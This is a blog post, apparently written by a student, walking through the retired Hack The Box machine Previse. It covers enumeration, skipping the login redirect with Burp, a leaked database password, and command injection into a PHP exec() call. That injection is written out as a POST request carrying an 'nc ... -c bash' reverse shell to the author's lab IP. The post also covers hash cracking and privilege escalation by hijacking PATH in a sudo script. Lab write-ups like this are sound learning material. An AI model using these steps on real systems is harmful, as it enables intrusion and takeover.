<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>HackTheBox — Previse | Sid's Blog</title>
<meta name=keywords content="sid,lacy,blog,website,cybersecurity,security,computer,hackthebox,htb,tech,previse">
<meta name=description content="Comprehensive walkthrough of the retired Previse machine on HackTheBox">
<meta name=author content="Sid Lacy">
<link rel=canonical href=https://hugoblog-19fed.web.app/docs/previse/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://hugoblog-19fed.web.app/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://hugoblog-19fed.web.app/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://hugoblog-19fed.web.app/favicon-32x32.png>
<link rel=apple-touch-icon href=https://hugoblog-19fed.web.app/apple-touch-icon.png>
<link rel=mask-icon href=https://hugoblog-19fed.web.app/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.92.0">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.2/styles/zenburn.min.css integrity="sha512-JPxjD2t82edI35nXydY/erE9jVPpqxEJ++6nYEoZEpX2TRsmp2FpZuQqZa+wBCen5U16QZOkMadGXHCfp+tUdg==" crossorigin=anonymous referrerpolicy=no-referrer><meta property="og:title" content="HackTheBox — Previse">
<meta property="og:description" content="Comprehensive walkthrough of the retired Previse machine on HackTheBox">
<meta property="og:type" content="article">
<meta property="og:url" content="https://hugoblog-19fed.web.app/docs/previse/"><meta property="article:section" content="docs">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="HackTheBox — Previse">
<meta name=twitter:description content="Comprehensive walkthrough of the retired Previse machine on HackTheBox">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Docs","item":"https://hugoblog-19fed.web.app/docs/"},{"@type":"ListItem","position":2,"name":"HackTheBox — Previse","item":"https://hugoblog-19fed.web.app/docs/previse/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox — Previse","name":"HackTheBox — Previse","description":"Comprehensive walkthrough of the retired Previse machine on HackTheBox","keywords":["sid","lacy","blog","website","cybersecurity","security","computer","hackthebox","htb","tech","previse"],"articleBody":"Hello, and thank you for expressing interest in my report on Previse, a CTF hosted by Hack the Box. Previse was uploaded by HTB user m4lwhere 138 days prior to the publication of this report and is currently considered by the HTB community to be easy to intermediate in terms of difficulty.\nPrevise requires the submission of a USER flag and a SYSTEM flag, and I have described the process I used to capture both in-depth below.\nFeedback? I can be reached via email.\nEnumeration Nmap This is a single-machine CTF, for which HTB has already provided the IP address (10.10.11.104), so we can begin with an NMAP scan on the target — taking some inspiration from IppSec, executing nmap -sC -sV -oA previse 10.10.11.104 will hopefully reveal some information of interest.\n$ nmap -sC -sV -oA previse 10.10.11.104 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 10.10.11.104 Host is up (0.083s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-title: Previse Login |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds As it appears, Previse is listening on port 22 for incoming SSH connections and on port 80 for HTTP requests with an Apache server. Navigating to http://10.10.11.104 redirects to http://10.10.11.104/login.php; here’s a screenshot of that page: Good news — a login portal is likely something we can exploit. I tried a few common credential combinations, such as admin:admin and user:password, but was unable to log in. No matter, however, as the site still may hold useful resources not protected by a credential prompt. To determine whether this is the case, let’s use Gobuster.\nGobuster gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php performs a brute force directory search on Previse to reveal any hidden pages with names found in directory-list-2.3-medium.txt and which have file extensions of .html, .txt, or .php. Executing that command took quite some time, and I unfortunately ran into rate-limiting issues — after all, the word list used contains 220560 elements. Eventually, however, Gobuster yielded the following:\n$ gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: html,txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 2801] [-- login.php] /download.php (Status: 302) [Size: 0] [-- login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [-- login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] /css (Status: 301) [Size: 310] [-- http://10.10.11.104/css/] /status.php (Status: 302) [Size: 2968] [-- login.php] /js (Status: 301) [Size: 309] [-- http://10.10.11.104/js/] /logout.php (Status: 302) [Size: 0] [-- login.php] /accounts.php (Status: 302) [Size: 3994] [-- login.php] /config.php (Status: 200) [Size: 0] /logs.php (Status: 302) [Size: 0] [-- login.php] Progress: 182532 / 882244 (20.69%) [ERROR] [!] Get \"http://10.10.11.104/17878\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] [!] Get \"http://10.10.11.104/chatterbox.txt\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) [ERROR] [!] Get \"http://10.10.11.104/merchantsolutions.php\": context deadline exceeded (Client.Timeout exceeded while awaiting headers) ^C Unfortunately, the majority of pages found by Gobuster redirect back to login.php page, and the exceptions are not useful in ways I have knowledge of… For example, viewing a global CSS configuration file was permitted sans-login at /css/uikit.min.css. Clearly, this issue calls for a different strategy.\nMITM Attack — Burp Suite Viewing Protected Pages If attempting to view specific pages leads to redirection back to login.php, perhaps some information may be gleaned from examining the redirect process. Burp Suite’s Proxy tool can be used to intercept and modify HTTP requests and responses — a man-in-the-middle (MITM) attack. Browsing to the accounts.php page is one such URL redirected to login.php, as shown by Gobuster: /accounts.php (Status: 302) [Size: 3994] [-- login.php]. See below: upon capturing the HTTP traffic of navigation to accounts.php in Burp Suite, we can see that the response for the request GET /accounts.php HTTP/1.1 is HTTP/1.1 302 Found, and not only that, the source of accounts.php has been captured as well. Seeing the “ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!” banner is a sure sign of progress. The captured source code, rendered above:\nHTTP/1.1 302 Found Date: Thu, 23 Dec 2021 10:43:36 GMT Server: Apache/2.4.29 (Ubuntu) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Location: login.php Content-Length: 3994 Connection: close Content-Type: text/html; charset=UTF-8  html head meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\" / meta charset=\"utf-8\" / meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" / meta name=\"description\" content=\"Previse rocks your socks.\" / meta name=\"author\" content=\"m4lwhere\" / link rel=\"shortcut icon\" href=\"/favicon.ico\" type=\"image/x-icon\" / link rel=\"icon\" href=\"/favicon.ico\" type=\"image/x-icon\" / link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"/apple-touch-icon.png\" link rel=\"icon\" type=\"image/png\" sizes=\"32x32\" href=\"/favicon-32x32.png\" link rel=\"icon\" type=\"image/png\" sizes=\"16x16\" href=\"/favicon-16x16.png\" link rel=\"manifest\" href=\"/site.webmanifest\" link rel=\"stylesheet\" href=\"css/uikit.min.css\" / script src=\"js/uikit.min.js\"script script src=\"js/uikit-icons.min.js\"script titlePrevise Create Accounttitle head body nav class=\"uk-navbar-container\" uk-navbar div class=\"uk-navbar-center\" ul class=\"uk-navbar-nav\" li class=\"uk-active\"a href=\"/index.php\"Homeali li a href=\"accounts.php\"ACCOUNTSa div class=\"uk-navbar-dropdown\" ul class=\"uk-nav uk-navbar-dropdown-nav\" lia href=\"accounts.php\"CREATE ACCOUNTali ul div li lia href=\"files.php\"FILESali li a href=\"status.php\"MANAGEMENT MENUa div class=\"uk-navbar-dropdown\" ul class=\"uk-nav uk-navbar-dropdown-nav\" lia href=\"status.php\"WEBSITE STATUSali lia href=\"file_logs.php\"LOG DATAali ul div li lia href=\"#\" class=\".uk-text-uppercase\"spanali li a href=\"logout.php\" button class=\"uk-button uk-button-default uk-button-small\"LOG OUTbutton a li ul div nav section class=\"uk-section uk-section-default\" div class=\"uk-container\" h2 class=\"uk-heading-divider\"Add New Accounth2 pCreate new user.p p class=\"uk-alert-danger\"ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!p pUsernames and passwords must be between 5 and 32 characters!p p form role=\"form\" method=\"post\" action=\"accounts.php\" div class=\"uk-margin\" div class=\"uk-inline\" span class=\"uk-form-icon\" uk-icon=\"icon: user\"span input type=\"text\" name=\"username\" class=\"uk-input\" id=\"username\" placeholder=\"Username\" div div div class=\"uk-margin\" div class=\"uk-inline\" span class=\"uk-form-icon\" uk-icon=\"icon: lock\"span input type=\"password\" name=\"password\" class=\"uk-input\" id=\"password\" placeholder=\"Password\" div div div class=\"uk-margin\" div class=\"uk-inline\" span class=\"uk-form-icon\" uk-icon=\"icon: lock\"span input type=\"password\" name=\"confirm\" class=\"uk-input\" id=\"confirm\" placeholder=\"Confirm Password\" div div button type=\"submit\" name=\"submit\" class=\"uk-button uk-button-default\"CREATE USERbutton form div section div class=\"uk-position-bottom-center uk-padding-small\" a href=\"https://m4lwhere.org/\" target=\"_blank\"button class=\"uk-button uk-button-text uk-text-small\"Created by m4lwherebuttona div body html The HTML above contains some interesting and relevant information:\n “Usernames and passwords must be between 5 and 32 characters” The user addition form requires a POST request to accounts.php with the following fields:  A username A password A password confirmation A click event on the CREATE USER button    Generating a Privileged User Given that criteria, consider the credential set username123:password123. We can enter that information into the actual accounts.php page by injecting a false HTTP response code of 200 (OK) using Burp Suite Proxy: Navigating to the login portal and submitting username123:password123 now permits access to any previously restricted credential-pages, as can be seen below, given the example of files.php: Building Familiarity with Previse Exploring the Previse Site A plethora of interesting material now lies within our grasp — for instance, a full site backup may be downloaded via a link at files.php. Or, perhaps nearly as significant, a log of user activity as related to file downloads may be downloaded at file_logs.php, which looks like so:\n$ cat previse.log time,user,fileID 1622482496,m4lwhere,4 1622485614,m4lwhere,4 1622486215,m4lwhere,4 1622486218,m4lwhere,1 1622486221,m4lwhere,1 1622678056,m4lwhere,5 1622678059,m4lwhere,6 1622679247,m4lwhere,1 1622680894,m4lwhere,5 1622708567,m4lwhere,4 1622708573,m4lwhere,4 1622708579,m4lwhere,5 1622710159,m4lwhere,4 1622712633,m4lwhere,4 1622715674,m4lwhere,24 1622715842,m4lwhere,23 1623197471,m4lwhere,25 1623200269,m4lwhere,25 1623236411,m4lwhere,23 1623236571,m4lwhere,26 1623238675,m4lwhere,23 1623238684,m4lwhere,23 1623978778,m4lwhere,32 1640244467,username,32 1640244685,username,32 1640244690,username,1 1640244699,username,12312421 1640244721,username,4 1640244726,username,5 1640244735,username,6 1640244741,username,24 1640244751,username,23 1640244755,username,25 1640244760,username,26 1640244769,username,32 1640244776,username,33 1640244793,username,24 1640246372,recon_pilot,32 1640247712,recon_pilot,33 1640249049,recon_pilot,32 1640260386,username123,32 As a reminder, user m4lwhere is the user who created this CTF; I assume all other users are currently active CTF participants. At the bottom, our injected username (username123) can be seen. The link to download the site backup is http:/10.10.11.104/download.php?file=32. The log shows various users attempting to download many other files, so I did the same — sadly, as far as I can tell, only file 32 exists.\nExamining the Previse Backup Returning to the website backup, it seems that the following files are included, consistent with the pages previously found by Gobuster:\n$ ls total 60K -rw-r--r-- 1 slak slak 5.6K Jun 12 2021 accounts.php -rw-r--r-- 1 slak slak 208 Jun 12 2021 config.php -rw-r--r-- 1 slak slak 1.6K Jun 9 2021 download.php -rw-r--r-- 1 slak slak 1.2K Jun 12 2021 file_logs.php -rw-r--r-- 1 slak slak 6.0K Jun 9 2021 files.php -rw-r--r-- 1 slak slak 217 Jun 3 2021 footer.php -rw-r--r-- 1 slak slak 1012 Jun 5 2021 header.php -rw-r--r-- 1 slak slak 551 Jun 5 2021 index.php -rw-r--r-- 1 slak slak 2.9K Jun 12 2021 login.php -rw-r--r-- 1 slak slak 190 Jun 8 2021 logout.php -rw-r--r-- 1 slak slak 1.2K Jun 9 2021 logs.php -rw-r--r-- 1 slak slak 1.3K Jun 5 2021 nav.php -rw-r--r-- 1 slak slak 1.9K Jun 9 2021 status.php The file config.php contains just the information I’d hoped for: plaintext credentials.\nphp function connectDB(){ $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?It appears that an SQL database is connected to using credential pair root:mySQL_p@ssw0rd!:). This may be our way in, should the database be vulnerable to code injection. The next step, then, requires setting aside my prejudice against PHP, as the other files must be searched for input handling issues. And Indeed, after spending an inordinate amount of time searching for issues within the PHP source of the site, logs.php contains a potentially exploitable PHP exec() function… Did I mention my distaste for PHP? Anyway, consider the exec function in question:\n$output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\"); If we craft a POST request such that the delimiter (delim) has an executable statement appended to it, that statement should be executed. For that reason, exec is a dangerous PHP function, especially given the lack of input validation present here. Always sanitize input!\nGaining Shell Access Writing a Malicious POST Request As previously mentioned, if we create a normal post request to file_logs.php as follows, we then only need to append a malicious custom delim parameter to the end — one step at a time though. Consider the following request, captured when submitting a request for log data from file_logs.php: At the bottom, delim=comma can be seen; this can be changed to delim=comma;  to execute  when the POST request is forwarded. Ideally, a reverse shell may be set up to grant shell access. This, of course, can be difficult to do without knowing what packages are installed on the target.\nI have only ever used Netcat with Metasploit modules on old Windows XP machines to create reverse shell access, so hopefully Previse has Netcat installed. A reverse shell using Netcat can be spawned with nc 10.10.14.70 1234 -c bash; so, the full post request can be as follows, given that my IP address is 10.10.14.70:\nPOST /logs.php HTTP/1.1 Host: 10.10.11.104 Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.10.11.104 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.10.11.104/file_logs.php Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=b1hcqu7ulch7gleqm9f5jnapvm Connection: close delim=comma; nc 10.10.14.70 1234 -c bash Connecting with Netcat Before sending the POST request with the malicious connection request, we must listen for incoming connections on port 1234, as specified, which is done with nc -nlp 1234. After doing so, the post request may be sent… Looks like Previse has Netcat installed after all — basic shell access has been achieved!\n$ nc -nlp 1234 listening on [any] 1234 ... connect to [10.10.14.70] from (UNKNOWN) [10.10.11.104] 48236 Executing whoami yields www-data, as expected.\nSearching for USER, SYSTEM Flags Connecting to the SQL Database The primary incentive behind gaining shell access was to connect to the SQL database using the root:mySQL_p@ssw0rd!:) credential set found in the site backup under config.php. Let’s see if those credentials work as expected:\n$ mysql -u root -p Enter password: mySQL_p@ssw0rd!:) Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 1434 Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ 5 rows in set (0.01 sec) mysql use previse; use previse; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql show tables; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ 2 rows in set (0.01 sec) mysql Finding and Cracking Password Hashes from the SQL Database It seems the credentials do work! That accounts table looks pretty interesting. Contents:\nmysql select * from accounts; select * from accounts; +----+---------------+------------------------------------+---------------------+ | id | username | password | created_at | +----+---------------+------------------------------------+---------------------+ | 1 | m4lwhere | REDACTED | 2021-05-27 18:18:36 | | 2 | Squid | REDACTED | 2021-12-23 05:14:33 | | 3 | username | REDACTED | 2021-12-23 07:08:53 | | 4 | recon_pilot | REDACTED | 2021-12-23 07:58:57 | | 5 | administrator | REDACTED | 2021-12-23 08:14:22 | | 6 | username123 | REDACTED | 2021-12-23 11:38:07 | | 7 | nada123 | REDACTED | 2021-12-23 13:11:39 | +----+---------------+------------------------------------+---------------------+ 7 rows in set (0.00 sec) Very nice! We have all existing usernames and their password hashes for each user of the Previse site — of course, only the m4lwhere user is of any interest, as all other usernames are HTB users. Note that, to preserve the integrity of the CTF, the password hashes have been redacted. John or Hashcat could be used here — I’ll use John, since I’m familiar with it and the GPU in my Parrot machine is far from powerful…\n$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long Created directory: /home/slak/.john Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ... Lets explore the Previse file system while John is running. Exiting from the SQL database and executing ls /home reveals the existence of the m4lwhere user’s home directory. Pushing further reveals…\nwww-data@previse:/var/www/html$ ls /home/m4lwhere user.txt www-data@previse:/var/www/html$ cat /home/m4lwhere/user.txt cat: /home/m4lwhere/user.txt: Permission denied The USER flag! Too bad it’s read-protected. No matter; remember the open port 22 from the enumeration stage? We’ll (hopefully) be able to SSH into Previse as m4lwhere soon enough. At that point, the permissions on user.txt won’t matter.\nAfter some time, the hash was successfully cracked.\nObtaining the USER Flag Let’s see if we can use our newfound password to ssh into Previse as user m4lwhere.\n$ ssh m4lwhere@10.10.11.104 The authenticity of host '10.10.11.104 (10.10.11.104)' can't be established. ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.11.104' (ECDSA) to the list of known hosts. m4lwhere@10.10.11.104's password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Dec 23 14:08:52 UTC 2021 System load: 0.0 Processes: 221 Usage of /: 51.3% of 4.85GB Users logged in: 1 Memory usage: 39% IP address for eth0: 10.10.11.104 Swap usage: 0% 0 updates can be applied immediately. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Dec 23 13:52:12 2021 from 10.10.16.52 m4lwhere@previse:~$ Success! Now to read the USER flag:\nm4lwhere@previse:~$ cat user.txt  HTB accepted the flag, but we’re not quite done yet; the SYSTEM flag remains.\nEscalating Privileges Executing sudo -l reveals that:\nUser m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh Interesting — here is the contents of access_backup.sh:\n#!/bin/bash  # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time gzip -c /var/log/apache2/access.log  /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz gzip -c /var/www/file_access.log  /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz Examining the script, it looks like development negligence turned in my favor. Both the gzip and date binaries are referenced relatively; therefore, we can edit PATH to point to my own gzip/date script(s). Consider the following commands, given that I have created a date program in /home/m4lwhere:\nm4lwhere@previse:~$ export PATH=:/home/m4lwhere m4lwhere@previse:~$ /bin/cat date #!/bin/bash /bin/su m4lwhere@previse:~$ /usr/bin/sudo /opt/scripts/access_backup.sh root@previse:/home/m4lwhere# Root access has been granted!\nObtaining the SYSTEM Flag All that is left is to print the SYSTEM flag:\nroot@previse:/home/m4lwhere# ls /root root.txt root@previse:/home/m4lwhere# cat /root/root.txt  And there it is — the SYSTEM flag! The flag was accepted by HTB; thus, Previse is complete.\nConclusion This was a very fun CTF overall, which I admit I found challenging despite the low difficulty rating relative to other HTB challenges. I had a lot of fun working on Previse, and it felt noticeably more accessible to me than some other HTB machines I’ve attempted. I learned a lot and I encourage others interested in red team security activities to give their own best effort toward this challenge… even if they end up with 50+ open browser tabs at the end like I did.\nI hope you found this guide helpful or inspirational. Thank you so much for reading, and check back soon for more activity reports.\n-Sid\nhttps://www.hackthebox.com/achievement/machine/787255/373\nFeedback? I can be reached via email.\n","wordCount":"2962","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","author":[{"@type":"Person","name":"Sid Lacy"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://hugoblog-19fed.web.app/docs/previse/"},"publisher":{"@type":"Organization","name":"Sid's Blog","logo":{"@type":"ImageObject","url":"https://hugoblog-19fed.web.app/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://hugoblog-19fed.web.app/ accesskey=h title="Sid's Blog (Alt + H)">Sid's Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://hugoblog-19fed.web.app/ title=Home>
<span>Home</span>
</a>
</li>
<li>
<a href=https://hugoblog-19fed.web.app/docs title=Documents>
<span>Documents</span>
</a>
</li>
<li>
<a href=https://hugoblog-19fed.web.app/posts title=Posts>
<span>Posts</span>
</a>
</li>
<li>
<a href=https://hugoblog-19fed.web.app/about title=About>
<span>About</span>
</a>
</li>
<li>
<a href=https://hugoblog-19fed.web.app/archive title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://hugoblog-19fed.web.app/search title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
HackTheBox — Previse
</h1>
<div class=post-description>
Comprehensive walkthrough of the retired Previse machine on HackTheBox
</div>
<div class=post-meta>14 min&nbsp;·&nbsp;Sid Lacy
</div>
</header>
<div class=post-content><p>Hello, and thank you for expressing interest in my report on <a href=https://app.hackthebox.com/machines/Previse>Previse</a>, a CTF hosted by Hack the Box. Previse was uploaded by HTB user <a href=https://app.hackthebox.com/users/107145>m4lwhere</a> 138 days prior to the publication of this report and is currently considered by the HTB community to be easy to intermediate in terms of difficulty.</p>
<p>Previse requires the submission of a USER flag and a SYSTEM flag, and I have described the process I used to capture both in-depth below.</p>
<p><em>Feedback? <a href="mailto:contact@swlacy.com?subject=Previse%20Report">I can be reached via email</a>.</em></p>
<h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2>
<h3 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3>
<p>This is a single-machine CTF, for which HTB has already provided the IP address (<strong>10.10.11.104</strong>), so we can begin with an NMAP scan on the target — taking some inspiration from <a href=https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA>IppSec</a>, executing <a href="https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oA+previse+10.10.11.104"><code>nmap -sC -sV -oA previse 10.10.11.104</code></a> will hopefully reveal some information of interest.</p>
<pre tabindex=0><code class=language-none data-lang=none>$ nmap -sC -sV -oA previse 10.10.11.104

Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 10.10.11.104
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
| /: 
| PHPSESSID: 
|_ httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
</code></pre><p>As it appears, Previse is listening on port 22 for incoming SSH connections and on port 80 for HTTP requests with an Apache server. Navigating to http://10.10.11.104 redirects to http://10.10.11.104/login.php; here&rsquo;s a screenshot of that page: <img loading=lazy src=/docs/previse1.png alt="Screenshot of http://10.10.11.104/login.php">
</p>
<p>Good news — a login portal is likely something we can exploit. I tried a few common credential combinations, such as <code>admin:admin</code> and <code>user:password</code>, but was unable to log in. No matter, however, as the site still may hold useful resources not protected by a credential prompt. To determine whether this is the case, let&rsquo;s use Gobuster.</p>
<h3 id=gobuster>Gobuster<a hidden class=anchor aria-hidden=true href=#gobuster>#</a></h3>
<p><code>gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php</code> performs a brute force directory search on Previse to reveal any hidden pages with names found in <em>directory-list-2.3-medium.txt</em> and which have file extensions of .html, .txt, or .php. Executing that command took quite some time, and I unfortunately ran into rate-limiting issues — after all, the word list used contains 220560 elements. Eventually, however, Gobuster yielded the following:</p>
<pre tabindex=0><code class=language-none data-lang=none>$ gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://10.10.11.104
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.1.0
[+] Extensions: html,txt,php
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php (Status: 302) [Size: 2801] [--&gt; login.php]
/download.php (Status: 302) [Size: 0] [--&gt; login.php]
/login.php (Status: 200) [Size: 2224]
/files.php (Status: 302) [Size: 4914] [--&gt; login.php]
/header.php (Status: 200) [Size: 980]
/nav.php (Status: 200) [Size: 1248]
/footer.php (Status: 200) [Size: 217] 
/css (Status: 301) [Size: 310] [--&gt; http://10.10.11.104/css/]
/status.php (Status: 302) [Size: 2968] [--&gt; login.php]
/js (Status: 301) [Size: 309] [--&gt; http://10.10.11.104/js/]
/logout.php (Status: 302) [Size: 0] [--&gt; login.php]
/accounts.php (Status: 302) [Size: 3994] [--&gt; login.php]
/config.php (Status: 200) [Size: 0]
/logs.php (Status: 302) [Size: 0] [--&gt; login.php]
Progress: 182532 / 882244 (20.69%)

